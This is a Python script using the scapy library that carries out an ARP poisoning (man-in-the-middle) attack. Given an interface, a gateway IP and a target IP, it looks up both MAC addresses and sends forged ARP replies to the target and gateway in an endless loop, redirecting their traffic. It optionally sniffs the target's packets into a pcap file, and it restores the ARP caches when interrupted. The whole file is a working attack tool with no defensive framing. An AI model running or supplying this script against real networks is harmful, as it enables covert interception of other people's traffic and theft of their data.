############################## BISMI ALLAH A'RAHMAN A'RAHIM #################################################
############################################## ARP POISONING ATTACK #########################################
import sys,os,signal,threading,argparse,time
from scapy.all import *

parser = argparse.ArgumentParser(description = "ARP Poisoning and saving targets packets in PCAP files")
parser.add_argument("-i",'--interface', dest = 'interface', type = str)
parser.add_argument('-c','--count', dest = 'count', type = int, help = '- Packets count')
parser.add_argument('-g',"--gateway", dest = 'gateway', help = '- Gateway local IP address', type = str)
parser.add_argument('-t','--target', dest = 'target',help = '- Targets IPs',  type = str)

args = parser.parse_args()

iface = args.interface
gateway = args.gateway
target = args.target
count = args.count

array = [iface, target, gateway]

problem = False
for n in range(len(array)):
      if not array[n]:
         problem = True
         break

if problem:
   print(parser.print_help())
   sys.exit(1)

conf.iface, conf.verb = iface, 0

def get_mac(dest_IP):
    response, unanswered = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = dest_IP), timeout = 2, retry = 15)
    for s,r in response:
        return r[Ether].src

def sniffer():
    target_filter = 'ip host %s' % target
    packets = sniff(filter = target_filter, iface = iface, count = count)
    pcap_file = 'target_sniffed_packets.pcap'
    print("[*] Writing %i packets on: %s" % (count, pcap_file))
    wrpcap(pcap_file,packets)
    print('[+] %i Packets wroten' % count)

def restore_targets(target, target_mac, gateway, gateway_mac):
    send(ARP(op = 2, hwdst = 'ff:ff:ff:ff:ff:ff', pdst = gateway, hwsrc = target_mac, psrc = target),count = 7)
    send(ARP(op = 2, hwdst = 'ff:ff:ff:ff:ff:ff', pdst = target, hwsrc = gateway_mac, psrc = gateway),count = 7)

def spoofing():
   try:
       target_mac = get_mac(target)   
       gateway_mac = get_mac(gateway)

       MACs = (target_mac, gateway_mac)
       IPs = (target, gateway)

       problem = False
       for m in range(len(MACs)):
           if not MACs[m]:
              problem = True
              break

       if not problem:
          for t in range(len(IPs)):
              print("[+] %s: is-at %s" %(IPs[t] , MACs[t]))

       else:
          for t in range(len(MACs)):
              if MACs[t] is None:
                 print('[!] Failed to get %s MAC address' % IPs[t])
                 break

       if not problem:
          if count:
             sniffer_thread = threading.Thread(target = sniffer)
             sniffer_thread.start()
             print("[+] Sniffer started for %i packets" % count)

          poison_gateway        = ARP()
          poison_gateway.op     = 2
          poison_gateway.psrc   = target
          poison_gateway.pdst   = gateway
          poison_gateway.hwdst  = gateway_mac

          poison_target       = ARP()
          poison_target.op    = 2
          poison_target.psrc  = gateway
          poison_target.pdst  = target 
          poison_target.hwdst = target_mac

          while True:
                send(poison_gateway)
                print('{} {}  {} is-at {}'.format(ARP().hwsrc,poison_gateway.hwdst,poison_gateway.psrc,poison_gateway.hwsrc))
                send(poison_target)
                print('{} {}  {} is-at {}'.format(ARP().hwsrc, poison_target.hwdst, poison_target.psrc, poison_target.hwsrc))
                time.sleep(2)
   except KeyboardInterrupt:
       print('\n[*] Restoring targets.')
       restore_targets(target, target_mac, gateway, gateway_mac)
spoofing()
################################## AL'HAMDU LILAH ###########################################################################
